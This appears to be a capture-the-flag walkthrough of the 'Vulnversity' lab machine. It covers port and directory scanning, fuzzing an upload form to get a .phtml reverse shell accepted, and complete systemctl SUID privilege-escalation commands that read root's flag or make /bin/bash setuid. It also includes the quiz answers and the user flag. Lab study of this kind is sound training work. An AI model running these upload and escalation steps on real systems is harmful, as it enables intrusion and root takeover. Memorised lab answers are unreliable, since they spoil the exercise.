# Vulnversity

### Reconnaissance

Scan the target

```
nmap -A -sC 10.10.84.35                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 17:06 GMT
Nmap scan report for 10.10.84.35
Host is up (0.0090s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA)
|   256 ac9dec44610c28850088e968e9d0cb3d (ECDSA)
|_  256 3050cb705a865722cb52d93634dca558 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2023-01-27T12:07:17-05:00
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-01-27T17:07:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.47 seconds
```

#### Questions

Scan the box, how many ports are open?

6

What version of the squid proxy is running on the machine?

3.5.12

How many ports will nmap scan if the flag -p-400 was used?

400

Using the nmap flag -n what will it not resolve?

DNS

What is the most likely operating system this machine is running?

Ubuntu

What port is the web server running on?

3333

### Locating directories with GoBuster

Run GoBuster `gobuster dir -u http://<ip>:3333 -w <word list location>`

```
gobuster dir -u http://10.10.84.35:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.84.35:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/27 17:15:00 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.84.35:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.84.35:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.84.35:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.84.35:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.84.35:3333/internal/]
/server-status        (Status: 403) [Size: 301]
Progress: 220050 / 220561 (99.77%)
===============================================================
2023/01/27 17:18:31 Finished
===============================================================
```

What is the directory that has an upload form?

/internal/

### Compromise the webserver

Use Burp to fuzz the upload form to see accepted extensions for the reverse shell

Make a wordlist with php extensions, upload a file and capture the request and send it to 
the intruder. 

Use sniper and the extension list to replace the php extension of your webshell. 
(don't include the `.` it will be urlencoded and the fuzzing won't work properly)

What extension is allowed?

.phtml

Upload the reverse shell, start a netcat listener and execute it with:

`http://<TARGET-IP>:<WEBSERVER-PORT>/internal/uploads/shell.phtml`

What is the name of the user who manages the webserver?

bill

What is the user flag?

8bd7992fbe8a6ad22a63361004cfcedb

### Privilege Escalation

Find binaries with SUID bit set `find / -perm /4000 -type -f -exec ls -ld {}\; 2>/dev/null`
or use linpeas.sh

On the system, search for all SUID files. What file stands out?

/bin/systemctl

GTFOBins shows an SUID exploit for systemctl:

```
TF=$(mktemp).service
echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "id > /tmp/output" <--- replace id with `cat <FILE>` (/root/root.txt)
> [Install]
> WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

This will output the contents of /root/root.txt to /tmp/output giving you the flag

Alternatively we can set the SUID bit on the bash binary to gain a root shell:

```
TF=$(mktemp).service
echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
/bin/bash -p 
```
